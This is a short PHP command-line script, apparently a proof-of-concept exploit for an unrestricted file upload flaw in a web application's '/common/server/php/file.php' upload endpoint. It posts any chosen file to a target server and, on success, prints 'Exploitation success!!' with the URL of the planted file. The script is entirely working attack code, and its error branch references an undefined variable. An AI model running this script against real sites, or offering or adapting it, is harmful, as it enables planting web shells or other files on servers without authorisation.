
 
$options = getopt(&#039;u:f:&#039;);
 
if(!isset($options[&#039;u&#039;],$options[&#039;f&#039;])) die("\nHow to use: php $_SERVER[PHP_SELF] -u URL -f FILE_TO_UPLOAD\nExample: php $_SERVER[PHP_SELF] -u www.example.com/paths -f myfile.txt\n");
 
$handle = curl_init();
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
curl_setopt($handle, CURLOPT_URL, "http://".$options[&#039;u&#039;]."/common/server/php/file.php?action=upload");
curl_setopt($handle, CURLOPT_POSTFIELDS,array("Filedata" => "@".$options[&#039;f&#039;]."","fileId" => $options["f"]));
$result = curl_exec($handle);
 
if(strpos($result,"UPLOAD_SUCCESS")){
    echo "\n_____________________________________________________________________\n";
    echo "\t[+] Exploitation success!!\n";
    echo "\t[+] http://$options[u]/files/$options[f]\n";
    echo "_____________________________________________________________________\n";
}else{
    echo "\n[-] Target is not exploitable\n";
    echo "[-] Message: ".$msg[1]."\n";
}                              
 
?>

